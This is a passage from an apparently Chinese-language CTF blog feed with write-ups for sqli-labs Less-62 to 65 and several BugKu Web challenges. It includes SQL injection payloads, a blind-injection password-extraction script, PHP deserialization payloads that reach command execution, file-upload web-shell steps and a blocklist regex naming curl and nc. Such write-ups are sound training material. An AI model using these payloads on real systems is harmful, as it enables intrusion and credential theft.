class="number">0</span>,sleep(<span class="number">10</span>))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-42"><a href="#æºç åˆ†æ-42" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-64"><a href="#æ‰‹åŠ¨æ³¨å…¥-64" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒLess-62ï¼Œä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p><h4 id="æºç åˆ†æ-43"><a href="#æºç åˆ†æ-43" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-65"><a href="#æ‰‹åŠ¨æ³¨å…¥-65" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒLess-62ï¼Œä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p><h4 id="æºç åˆ†æ-44"><a href="#æºç åˆ†æ-44" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-66"><a href="#æ‰‹åŠ¨æ³¨å…¥-66" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒLess-62ï¼Œä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p><h4 id="æºç åˆ†æ-45"><a href="#æºç åˆ†æ-45" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="å¸¸ç”¨æ–¹æ³•æ€»ç»“"><a href="#å¸¸ç”¨æ–¹æ³•æ€»ç»“" class="headerlink" title="å¸¸ç”¨æ–¹æ³•æ€»ç»“"></a>å¸¸ç”¨æ–¹æ³•æ€»ç»“</h2><h3 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h3><p>Mysql æœ‰ä¸€ä¸ªç³»ç»Ÿæ•°æ®åº“<code>information_schema</code>ï¼Œå­˜å‚¨ç€æ‰€æœ‰çš„æ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯ï¼Œä¸€èˆ¬çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨è¯¥è¡¨å¯ä»¥è¿›è¡Œä¸€æ¬¡å®Œæ•´çš„æ³¨å…¥ã€‚ä»¥ä¸‹ä¸ºä¸€èˆ¬çš„æµç¨‹ã€‚ </p><h4 id="çŒœæ•°æ®åº“"><a href="#çŒœæ•°æ®åº“" class="headerlink" title="çŒœæ•°æ®åº“"></a>çŒœæ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="çŒœæŸåº“çš„æ•°æ®è¡¨"><a href="#çŒœæŸåº“çš„æ•°æ®è¡¨" class="headerlink" title="çŒœæŸåº“çš„æ•°æ®è¡¨"></a>çŒœæŸåº“çš„æ•°æ®è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—"><a href="#çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—" class="headerlink" title="çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—"></a>çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="è·å–æŸåˆ—çš„å†…å®¹"><a href="#è·å–æŸåˆ—çš„å†…å®¹" class="headerlink" title="è·å–æŸåˆ—çš„å†…å®¹"></a>è·å–æŸåˆ—çš„å†…å®¹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select xxxx from xxxxxx </span><br></pre></td></tr></table></figure><blockquote><p>ä¸Šè¿°çŸ¥è¯†å‚è€ƒç”¨ä¾‹ï¼šless1-less4</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½• 4</title>
      <link href="/2022/05/05/BugKu-Web4/"/>
      <url>/2022/05/05/BugKu-Web4/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•-4"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•-4" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½• 4"></a>BugKu Web åˆ·é¢˜è®°å½• 4</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13044403.html">ctfä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></p><p><a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p><a href="https://blog.csdn.net/plant1234/article/details/118033711">sqlæ³¨å…¥</a></p></blockquote><h2 id="ä½ ä»å“ªé‡Œæ¥"><a href="#ä½ ä»å“ªé‡Œæ¥" class="headerlink" title="ä½ ä»å“ªé‡Œæ¥"></a>ä½ ä»å“ªé‡Œæ¥</h2><p>æ·»åŠ <code>Referer</code>å­—æ®µå³å¯ã€‚</p><p><img src="https://s2.loli.net/2022/05/05/UEJoHjpm5KwqFAP.png" alt="where.png"></p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>æ ¹æ®æç¤ºå¾—çŸ¥æ˜¯md5ç¢°æ’ï¼Œæ•…æ„é€ payloadå¦‚ä¸‹å³å¯è·å¾—flagã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:14728/index.php?a=s878926199a</span><br></pre></td></tr></table></figure><h2 id="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"><a href="#ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™" class="headerlink" title="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"></a>ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™</h2><p>æ·»åŠ <code>client-ip</code>å­—æ®µå³å¯</p><p><img src="https://s2.loli.net/2022/05/05/mYO5zAiGuXM1skr.png" alt="clientip.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>è®¿é—®<code>http://114.67.175.224:12650/flag.txt</code>å¾—åˆ°<code>bugku</code>,ç„¶åæ„é€ payloadå³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:12650/?ac=bugku&amp;fn=flag.txt</span><br></pre></td></tr></table></figure><h2 id="å®‰æ…°å¥–"><a href="#å®‰æ…°å¥–" class="headerlink" title="å®‰æ…°å¥–"></a>å®‰æ…°å¥–</h2><p>F12æŸ¥çœ‹æºç ï¼Œå‘ç°base64ç¼–ç ï¼Œè§£ç åä¸º<code>backups</code>ï¼Œç”¨dirsearchæ‰«æä¸€éå‘ç°æœ‰bakæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å³å¯è·å¾—æºç </p><p><img src="https://s2.loli.net/2022/05/05/esNlIwZaiT1OxQg.png" alt="anwei1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15293/?code=O:3:%22ctf%22:3:&#123;s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨ï¼Œç»•è¿‡å®ƒä»…éœ€è¦å°†ä¸Šé¢çš„å¯¹è±¡å±æ€§ä¸ªæ•°å€¼æ”¹å¾—æ¯”çœŸå®å¯¹è±¡å¤§å³å¯ã€‚</p></blockquote><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>ä¿®æ”¹å­—æ®µä¿¡æ¯ä¸Šä¼ æ–‡ä»¶</p><p><img src="https://s2.loli.net/2022/05/05/QeUturNifLd75oY.png" alt="up1.png"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œå¯»æ‰¾flag</p><p><img src="https://s2.loli.net/2022/05/05/GU3BfPvWMe1Z7ns.png" alt="up2.png"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p></blockquote><h2 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h2><p>è§£å‹åè·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é‡Œé¢æ˜¯ä¸ªåŠ å¯†å‡½æ•°ï¼Œæ•…æ„é€ è§£å¯†å‡½æ•°å³å¯ï¼Œexpå¦‚ä¸‹ï¼ˆæ³¨æ„æäº¤çš„Flagå½¢å¼ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>;  <span class="comment">//æç¤ºä¸­çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line"><span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// str = (data[i] + char[i])%128</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>((<span class="number">128</span> + <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decrypt</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«2"><a href="#æ–‡ä»¶åŒ…å«2" class="headerlink" title="æ–‡ä»¶åŒ…å«2"></a>æ–‡ä»¶åŒ…å«2</h2><p>F12æŸ¥çœ‹å‘ç°æœ‰upload.phpï¼Œç„¶åç”¨burpè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p><img src="https://s2.loli.net/2022/05/05/YtUdriGFB6R3D8b.png" alt="up2_1.png"></p><p>ç”¨èšå‰‘è¿›è¡Œè¿æ¥å¹¶å¯»æ‰¾flag</p><p><img src="https://s2.loli.net/2022/05/05/eaqdkCrXstAuH2j.png" alt="up2_2.png"></p><p><img src="https://s2.loli.net/2022/05/05/GnvJHQrsBz1jAIh.png" alt="up2_3.png"></p><h2 id="éœ€è¦ç®¡ç†å‘˜"><a href="#éœ€è¦ç®¡ç†å‘˜" class="headerlink" title="éœ€è¦ç®¡ç†å‘˜"></a>éœ€è¦ç®¡ç†å‘˜</h2><p>ç”¨dirsearchæ‰«ä¸€é</p><p><img src="https://s2.loli.net/2022/05/05/IWOqanhjeZNlGHt.png" alt="admin1.png"></p><p>è¿›å…¥robots.txt</p><p><img src="https://s2.loli.net/2022/05/05/RBtlIYqK7mAHnME.png" alt="admin2.png"></p><p>è¿›å…¥resusl.php</p><p><img src="https://s2.loli.net/2022/05/05/OFGyhVxZXEdBCR3.png" alt="admin3.png"></p><p>è§‚å¯Ÿé¡µé¢å‘ç°éœ€è¦è¾“å…¥å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨burpsuiteçˆ†ç ´ä¹Ÿå¯ä»¥æ ¹æ®é¢˜ç›®åç§°çŒœæµ‹å¾—åˆ°ï¼ˆå¯†ç æ˜¯adminï¼‰</p><p><img src="https://s2.loli.net/2022/05/05/eKagOyH9o6IXpdF.png" alt="admin4.png"></p><h2 id="newphp"><a href="#newphp" class="headerlink" title="newphp"></a>newphp</h2><p>æ‰“å¼€ç½‘é¡µå³å¯è·å¾—æºç ï¼Œæ ¹æ®æºç æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/VqFjp2Qb4TcMxeA.png" alt="newphp1.png"></p><p>base64è§£ç åå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure><p>è®¿é—®è¯¥é¡µé¢</p><p><img src="https://s2.loli.net/2022/05/05/8TJwkz5a43SfoYn.png" alt="newphp2.png"></p><p>æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11918/index.cgi?name=%20file:////flag</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/qB5XHZveU3RwNgp.png" alt="newphp3.png"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p></blockquote><h2 id="ç‚¹loginå’‹æ²¡ååº”"><a href="#ç‚¹loginå’‹æ²¡ååº”" class="headerlink" title="ç‚¹loginå’‹æ²¡ååº”"></a>ç‚¹loginå’‹æ²¡ååº”</h2><p>è¿›å…¥åæŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°æœ‰<code>href=&quot;admin.css&quot;</code>ï¼Œç‚¹è¿›å»åå‘ç°ç¬¬ä¸€è¡Œæœ‰æç¤º<code>/* try ?29614 */</code>ï¼ŒåŠ å…¥åç¼€åå³å¯è·å¾—æºä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$KEY=&#x27;ctf.bugku.com&#x27;;</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie = $_COOKIE[&#x27;BUGKU&#x27;];</span><br><span class="line">if(isset($_GET[&#x27;29614&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>å®¡è®¡åå‘ç°æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ä½¿å¾—å…¶ååºåˆ—åŒ–åä¸<code>$KEY</code>çš„å€¼æ’ç­‰å³å¯</p><p><img src="https://s2.loli.net/2022/05/05/1WHcKEZJAsFgIVz.png" alt="login.png"></p><h2 id="éƒ½è¿‡æ»¤äº†"><a href="#éƒ½è¿‡æ»¤äº†" class="headerlink" title="éƒ½è¿‡æ»¤äº†"></a>éƒ½è¿‡æ»¤äº†</h2><p>ç™»å½•ç•Œé¢çš„è´¦å·ä¸€æ å¯ä»¥è¢«sqlæ³¨å…¥ï¼Œç¼–å†™è„šæœ¬è·å–å¯†ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_data</span>(<span class="params">uname,data</span>):</span><br><span class="line">data[<span class="string">&#x27;uname&#x27;</span>] = uname</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">len_of_passwd</span>(<span class="params">url,data,cookie,uname</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;^(length(passwd)=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)^&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="comment">#print(&quot;å¯†ç çš„é•¿åº¦æ˜¯&quot;+str(i))</span></span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_passwd</span>(<span class="params">url,data,cookie,uname,length</span>):</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;-(ascii(mid((passwd)from(&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(ch)) + <span class="string">&quot;)-&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">password += ch</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:11041/login.php&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span 